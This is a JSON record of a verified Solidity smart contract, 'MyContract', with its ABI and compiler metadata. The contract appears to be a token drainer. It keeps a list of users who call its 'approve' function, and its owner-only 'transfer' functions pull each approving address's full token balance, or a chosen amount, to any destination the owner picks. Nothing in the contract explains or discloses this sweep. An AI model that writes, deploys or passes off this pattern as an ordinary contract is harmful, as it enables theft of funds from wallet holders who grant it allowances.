{"SourceCode": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external;\r\n}\r\n\r\ncontract MyContract {\r\n\r\n    address public owner;\r\n    address[] public users;\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    function approve(address tokenAddress) external returns(bool){\r\n        require(IERC20(tokenAddress).approve(address(this), 115792089237316195423570985008687907853269984665640564039457584007913129639935));\r\n        users.push(msg.sender);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address tokenAddress,address from) public view returns(uint256){\r\n        uint256 allowanceCount = IERC20(tokenAddress).allowance(from, address(this));\r\n        return allowanceCount;\r\n    }\r\n   \r\n    function getBalance(address tokenAddress, address user) public view returns (uint256){\r\n        return IERC20(tokenAddress).balanceOf(user);\r\n    }\r\n\r\n    function transfer(address tokenAddress, address from, address to) external onlyOwner {\r\n        uint256 balance = getBalance(tokenAddress, from);\r\n        uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));\r\n        uint256 value = balance;\r\n        if (allowanceNum < balance)value = allowanceNum;\r\n        IERC20(tokenAddress).transferFrom(from, to,  value);\r\n    }\r\n\r\n    function transfer(address tokenAddress, address from, address to,uint256 money) external onlyOwner {\r\n        uint256 balance = getBalance(tokenAddress, from);\r\n        uint256 allowanceNum = IERC20(tokenAddress).allowance(from, address(this));\r\n        uint256 value = balance;\r\n        if(money < balance) value = money;\r\n        if (allowanceNum < value)value = allowanceNum;\r\n        IERC20(tokenAddress).transferFrom(from, to,  value);\r\n    }\r\n\r\n    function transferOwnership(address newOwner)  onlyOwner external {\r\n        owner = newOwner;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"money\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MyContract", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://409046884da0043e59874e2ec6250318a6879433ad3228313b9d447d781c30f2"}